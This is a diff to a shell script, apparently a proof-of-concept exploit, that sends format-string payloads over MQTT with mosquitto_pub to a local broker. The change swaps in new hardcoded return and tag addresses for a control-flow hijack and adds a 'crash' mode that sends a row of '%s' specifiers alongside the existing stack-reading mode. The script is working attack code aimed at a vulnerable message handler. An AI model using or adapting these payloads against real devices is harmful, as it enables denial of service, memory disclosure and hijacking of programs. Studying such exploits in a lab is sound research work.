@@ -5,9 +5,9 @@
 
 command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"
 
-tag_addr="e82f403f"
+tag_addr="ec2f403f"
 write_addr="5098fc3f5198fc3f5298fc3f5398fc3f"
-ret_addr="507efc3f517efc3f527efc3f"
+ret_addr="607efc3f617efc3f627efc3f"
 hijack_addr="04010840080108400c010840"
 
 nl_bin=$(echo "0a0d" | xxd -p -r)
@@ -17,7 +17,10 @@ write_addr_bin=$(echo $write_addr | xxd -p -r)
 ret_addr_bin=$(echo $ret_addr | xxd -p -r)
 hijack_addr_bin=$(echo $hijack_addr | xxd -p -r)
 
-if [[ $1 == "readstack" ]]; then
+if [[ $1 == "crash" ]]; then
+    $command_prefix "CRASHING THE PROGRAM:"
+    $command_prefix "%s %s %s %s %s %s %s %s %s %s"
+elif [[ $1 == "readstack" ]]; then
     # Reading the stack
     $command_prefix "READING THE STACK:"
     $command_prefix "$nl_bin \
